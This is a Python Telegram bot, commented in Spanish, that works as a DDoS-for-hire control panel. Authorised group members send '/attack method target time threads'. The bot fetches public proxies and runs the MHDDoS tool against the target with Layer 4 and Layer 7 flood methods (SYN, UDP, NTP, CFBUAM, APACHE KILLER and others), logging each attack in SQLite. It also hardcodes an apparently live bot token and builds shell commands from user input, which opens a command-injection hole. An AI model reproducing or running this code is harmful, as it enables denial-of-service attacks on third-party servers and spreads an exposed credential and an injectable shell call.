import telebot
import subprocess
import requests
import os
from datetime import datetime, timedelta
import sqlite3
import time
import psutil

# Reemplaza con tu propio token de bot de Telegram
API_TOKEN = '6623354999:AAGk0m62dSJTYegCAvC--DeajefaTytfnbM'
bot = telebot.TeleBot(API_TOKEN)

# ID del administrador para notificar errores
ADMIN_ID = 123456789  # Reemplaza con el ID de administrador

# IDs de grupos permitidos (números negativos para grupos)
ALLOWED_GROUPS = [-1001234567890]  # Reemplaza con los IDs de grupos permitidos

# IDs de usuarios permitidos
ALLOWED_USERS = {987654321, 123456789}  # Reemplaza con los IDs de usuarios permitidos

# Métodos L4 y L7
L4_METHODS = {
    'MEM', 'RDP', 'NTP', 'ARD', 'VSE', 'SYN', 'UDP', 'CHAR',
    'MINECRAFT', 'MCBOT', 'TCP'
}

L7_METHODS = {
    'COOKIE', 'BYPASS', 'OVH', 'DGB', 'STRESS', 'DOWNLOADER', 'NULL', 'AVB',
    'GET', 'CFB', 'POST', 'EVEN', 'DYN', 'GSB', 'XMLRPC', 'SLOW', 'BOT', 'PPS',
    'CFBUAM', 'APACHE KILLER', 'RHEX', 'STOMP'
}

# Ruta de la base de datos
DB_PATH = 'attacks.db'  # Reemplaza con la ruta correcta a tu base de datos

# Función para obtener proxies de la API y guardarlas en un archivo
def get_proxies(user_id):
    try:
        response = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&simplified=true')
        if response.status_code == 200:
            proxies = response.text
            filename = f'proxy_{user_id}.txt'
            with open(filename, 'w') as file:
                file.write(proxies)
            return filename
        else:
            return None
    except Exception as e:
        bot.send_message(ADMIN_ID, f'Error obteniendo proxies: {e}')
        print(f'Error obteniendo proxies: {e}')
        return None

# Función para calcular el número de hilos recomendados
def calculate_threads(ram_gb, reserved_ram_mb=256, ram_per_thread_mb=10):
    total_ram_mb = ram_gb * 1024
    available_ram_mb = total_ram_mb - reserved_ram_mb
    max_threads = available_ram_mb // ram_per_thread_mb
    return max_threads

# Función para registrar un ataque en la base de datos
def log_attack(user_id, metodo, objetivo, tiempo, start_time, end_time=None):
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO attacks (user_id, metodo, objetivo, tiempo, start_time, end_time)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (user_id, metodo, objetivo, tiempo, start_time, end_time))
        conn.commit()

# Función para actualizar el ataque en la base de datos
def update_attack(user_id, metodo, objetivo, tiempo, start_time, end_time):
    with sqlite3.connect(DB_PATH) as conn:
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE attacks
            SET end_time = ?
            WHERE user_id = ? AND metodo = ? AND objetivo = ? AND tiempo = ? AND start_time = ?
        ''', (end_time, user_id, metodo, objetivo, tiempo, start_time))
        conn.commit()

# Comando para ejecutar el ataque
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id

    # Verificar si el chat es un grupo permitido
    if chat_id not in ALLOWED_GROUPS:
        bot.send_message(chat_id, "您没有权限使用此机器人。")  # Mensaje en chino
        return

    # Verificar si el usuario está en la lista de permitidos
    if user_id not in ALLOWED_USERS:
        bot.send_message(chat_id, "您没有权限使用此机器人。")  # Mensaje en chino
        return

    # Extrae el comando del mensaje
    command_text = message.text.replace('/attack', '').strip()
    args = command_text.split()

    # Verifica si los argumentos son correctos
    if len(args) != 4:
        bot.reply_to(message, "Formato incorrecto. Usa: /attack metodo objetivo tiempo hilos")
        return

    metodo, objetivo, tiempo, hilos = args

    # Validar hilos
    try:
        hilos = int(hilos)
        if hilos <= 0:
            raise ValueError("Número de hilos debe ser positivo.")
    except ValueError as e:
        bot.reply_to(message, f"Error en el número de hilos: {e}")
        return

    # Obtener la memoria disponible
    ram_gb = psutil.virtual_memory().total / (1024 ** 3)  # RAM total en GB
    max_threads = calculate_threads(ram_gb)

    # Limitar el número de hilos basado en el entorno
    if hilos > max_threads:
        hilos = max_threads

    # Obtener el archivo de proxies
    proxy_file = None
    if metodo in {'MINECRAFT', 'MCBOT', 'TCP'} or metodo in L7_METHODS:
        proxy_file = get_proxies(user_id)
        if not proxy_file:
            bot.reply_to(message, "No se pudieron obtener proxies. Intenta de nuevo más tarde.")
            return

    # Preparar el comando según el método
    if metodo in {'MINECRAFT', 'MCBOT', 'TCP'}:
        command = f'python3 /content/MHDDoS/start.py {metodo} {objetivo} {hilos} {tiempo} 1 {proxy_file}'
    elif metodo in {'MEM', 'RDP', 'NTP', 'ARD', 'VSE', 'SYN', 'UDP', 'CHAR'}:
        command = f'python3 /content/MHDDoS/start.py {metodo} {objetivo} {hilos} {tiempo}'
    elif metodo in L7_METHODS:
        command = f'python3 /content/MHDDoS/start.py {metodo} {objetivo} {hilos} 30000 {proxy_file} 1000 {tiempo}'

    # Notificar que el ataque ha comenzado
    bot.send_message(chat_id, f'¡Ataque en proceso! Método: {metodo}, Objetivo: {objetivo}, Tiempo: {tiempo}, Hilos: {hilos}')

    # Registrar inicio del ataque
    start_time = datetime.now().isoformat()
    end_time = (datetime.now() + timedelta(seconds=int(tiempo))).isoformat()
    log_attack(user_id, metodo, objetivo, tiempo, start_time, end_time)

    # Ejecutar el comando en el servidor
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Imprimir la salida del comando en la terminal
        for stdout_line in iter(process.stdout.readline, ""):
            print(stdout_line.strip())
        for stderr_line in iter(process.stderr.readline, ""):
            print(stderr_line.strip())

        process.stdout.close()
        process.stderr.close()
        process.wait()

    except Exception as e:
        bot.send_message(chat_id, f'Ocurrió un error al ejecutar el comando: {e}')
        bot.send_message(ADMIN_ID, f'Ocurrió un error al ejecutar el comando: {e}')
        print(f'Ocurrió un error al ejecutar el comando: {str(e)}')

    # Eliminar el archivo de proxies
    if proxy_file and os.path.exists(proxy_file):
        os.remove(proxy_file)

    # Registrar fin del ataque y notificar al usuario
    update_attack(user_id, metodo, objetivo, tiempo, start_time, end_time)
    bot.send_message(chat_id, "¡Ataque finalizado!")

# Iniciar el bot
bot.polling()
